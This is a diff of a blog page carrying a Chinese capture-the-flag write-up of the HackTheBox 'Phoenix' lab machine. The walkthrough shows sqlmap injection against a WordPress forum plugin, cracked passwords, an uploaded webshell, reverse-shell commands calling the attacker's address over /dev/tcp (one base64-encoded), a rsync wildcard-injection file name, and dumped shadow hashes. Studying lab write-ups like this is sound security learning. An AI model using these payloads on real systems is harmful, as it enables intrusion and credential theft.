@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;448 10.10.11.149   端口扫描22,80,443: 123456789101112131415161718192021222324252627282930$ nmap -sC -sV 10.10.11.149Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;448 10.10.11.149                                                                                                              端口扫描22,80,443: 12345">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Phoenix - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/04/21/Phoenix-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;448 10.10.11.149   端口扫描22,80,443: 123456789101112131415161718192021222324252627282930$ nmap -sC -sV 10.10.11.149Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;448 10.10.11.149                                                                                                              端口扫描22,80,443: 12345">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022041401.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022041402.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022041403.jpg">
@@ -132,7 +132,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -221,20 +221,55 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/448" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/448</a></li>
 <li>10.10.11.149</li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041401.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041401.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,443:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.149</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 14:20 CST</span><br><span class="line">Nmap scan report for 10.10.11.149</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 9d:f3:87:cd:34:75:83:e0:3f:50:d8:39:c6:a5:32:9f (RSA)</span><br><span class="line">|   256 ab:61:ce:eb:ed:e2:86:76:e9:e1:52:fa:a5:c7:7b:20 (ECDSA)</span><br><span class="line">|_  256 26:2e:38:ca:df:72:d4:54:fc:75:a4:91:65:cc:e8:b0 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Did not follow redirect to https://phoenix.htb/</span><br><span class="line">443/tcp open  ssl/http Apache httpd</span><br><span class="line">| ssl-cert: Subject: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US</span><br><span class="line">| Not valid before: 2022-02-15T20:08:43</span><br><span class="line">|_Not valid after:  2032-02-13T20:08:43</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">| tls-alpn:</span><br><span class="line">|   h2</span><br><span class="line">|_  http/1.1</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/wp-admin/</span><br><span class="line">|_http-title: Did not follow redirect to https://phoenix.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 80.21 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80-443"><a href="#80-443" class="headerlink" title="80/443"></a>80/443</h2><p>需要加hosts</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.149 phoenix.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041402.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041402.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="wordpress-amp-amp-Forum"><a href="#wordpress-amp-amp-Forum" class="headerlink" title="wordpress &amp;&amp; Forum"></a>wordpress &amp;&amp; Forum</h2><p>details里read blog，可以注册登录,是一个wordpress：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041403.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041403.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>另外还有个forum，里面可以查看members得到一些用户名：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041404.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041404.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="Asgaros-Forum"><a href="#Asgaros-Forum" class="headerlink" title="Asgaros Forum"></a>Asgaros Forum</h1><p>直接查看源码可以知道forum是wp插件Asgaros Forum，1.15.12：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041405.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041405.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以搜到相关漏洞：</p>
 <ul>
 <li>Asgaros Forum &lt; 1.15.13 - Unauthenticated SQL Injection WordPress Security Vulnerability<br><a href="https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1" target="_blank" rel="noopener">https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1</a></li>
@@ -243,7 +278,14 @@
 <p>知道是wordpress直接去dump wp_users 了，再去跑表太费时间了,破解出来phoenix密码，但登录还有2FA</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --url https://phoenix.htb/forum/?subscribe_topic=1 --level 3 --risk 3 --batch</span><br><span class="line">sqlmap --url https://phoenix.htb/forum/\?subscribe_topic\=1 --level 3 --risk 3 --batch --dbs</span><br><span class="line">sqlmap --url https://phoenix.htb/forum/\?subscribe_topic\=1 --level 3 --risk 3 --batch -D wordpress -T wp_users --dump</span><br><span class="line">sqlmap --url https://phoenix.htb/forum/\?subscribe_topic\=1 --level 3 --risk 3 --batch -D wordpress -T wp_users -C user_login,user_pass --dump --threads 10</span><br><span class="line"></span><br><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">phoenix ： phoenixthefirebird14</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041406.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041406.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>所以需要其他方式，例如通过插件,利用插件漏洞：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --url https://phoenix.htb/forum/\?subscribe_topic\=1 --level 3 --risk 3 --batch -D wordpress -T wp_options -C option_value --where "option_name='active_plugins'" --dump</span><br></pre></td></tr></table></figure>
 
@@ -252,12 +294,35 @@
 <li>Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/50287" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/50287</a></li>
 </ul>
 <h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>利用插件漏洞获取shell，因为是https，需要修改exp， 在请求中添加verify=False,另外shell需要phtml格式：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041407.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041408.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041407.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041408.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>webshell执行命令获取reverse shell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phoenix.htb&#x2F;wp-admin&#x2F;shell.phtml?cmd&#x3D;bash%20-c%20&#39;exec%20bash%20-i%20%26%3E&#x2F;dev&#x2F;tcp&#x2F;10.10.14.13&#x2F;4444%20%3C%261&#39;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041409.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041409.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="databases"><a href="#databases" class="headerlink" title="databases"></a>databases</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] wordpress</span><br></pre></td></tr></table></figure>
 
 <h2 id="wp-users"><a href="#wp-users" class="headerlink" title="wp_users"></a>wp_users</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Database: wordpress</span><br><span class="line">Table: wp_users</span><br><span class="line">[5 entries]</span><br><span class="line">+------------+------------------------------------+</span><br><span class="line">| user_login | user_pass                          |</span><br><span class="line">+------------+------------------------------------+</span><br><span class="line">| john       | $P$B8eBH6QfVODeb&#x2F;gYCSJRvm9MyRv7xz. |</span><br><span class="line">| Phoenix    | $P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh&#x2F;gc. |</span><br><span class="line">| Jane       | $P$BJCq26vxPmaQtAthFcnyNv1322qxD91 |</span><br><span class="line">| Jsmith     | $P$BV5kUPHrZfVDDWSkvbt&#x2F;Fw3Oeozb.G. |</span><br><span class="line">| Jack       | $P$BzalVhBkVN.6ii8y&#x2F;nbv3CTLbC0E9e. |</span><br><span class="line">+------------+------------------------------------+</span><br></pre></td></tr></table></figure>
@@ -270,17 +335,38 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;wordpress&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;&lt;++32%himself%FIRM%section%32++&gt;&#39; );</span><br></pre></td></tr></table></figure>
 
 <p> /etc/passwd中可以发现john用户，前面得到的hash破解出来的他的密码 superphoenix ,但直接切换也存在2FA：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041410.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041410.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>查看/etc/pam.d/sshd配置，可以发现</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth [success&#x3D;1 default&#x3D;ignore] pam_access.so accessfile&#x3D;&#x2F;etc&#x2F;security&#x2F;access-local.conf</span><br></pre></td></tr></table></figure>
 
 <p> 查看配置，发现只允许10.11.2.13/24 ssh：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041411.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041411.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>所以是需要通过隧道，从eth0这个ip进行ssh</p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>打通隧道，之后ssh连接</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">./chisel_1.7.0-rc7_darwin_amd64 server -p 6969 --reverse</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">./chisel_1.7.6_linux_amd64 client 10.10.14.13:6969 R:2222:10.11.12.13:22</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">ssh editor@127.0.0.1 -p 2222</span><br><span class="line">superphoenix</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041412.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041412.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>/usr/local/bin里有个cron.sh.x</p>
 <p>手动尝试运行，结合pspy64监控，可以发现调用rsync，使用通配符</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/</span><br></pre></td></tr></table></figure>
@@ -293,9 +379,23 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /backups</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.13/4444 0&gt;&amp;1</span><br><span class="line">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ0NDQgMD4mMQo=</span><br><span class="line"></span><br><span class="line">echo "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ0NDQgMD4mMQo= | base64 -d | bash" &gt; shell.miao</span><br><span class="line">touch -- "-e sh shell.miao"</span><br><span class="line">chmod +x shell.miao</span><br><span class="line">chmod +x -- '-e sh shell.miao'</span><br></pre></td></tr></table></figure>
 
 <p>( 这里图文件名有问题，失败的，懒得换新图了，注意前面说的，文件名需要有后缀)</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041413.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041413.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>等待执行(3分钟自动执行一次)，我们自定义的命令成功被运行，得到root shell：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041414.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022041414.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$U6DRf4846rMqwA5E$Bwo3RxRA1t15bx6xvX8fVZ1cNfMoFVkpwyoWcK2gz3HRX16&#x2F;d.zqHlQI68v8drjuFWucpXhRYpIbnhg35.Vjc0:18944:0:99999:7:::</span><br><span class="line">phoenix:$6$gLLB4KeGdb5Hnsc2$t6EYvvoh1DnVbPUbySB.0IVNgQicWBhS87fatD7umPj9PAKs8ZDvwHcrwp.dV&#x2F;ZFnQDXCOc81pGrLcKyRuUtl0:19046:0:99999:7:::</span><br><span class="line">editor:$6$CoywBsVPjctrApY9$P16ZwO5otTjkUm1B8kz8aKpgvC0mEK6g9Mq2wexdaRdF4kT3LuSM56R3BbJm28fp&#x2F;39vUGJBRbPyw8r34PO1u&#x2F;:19039:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
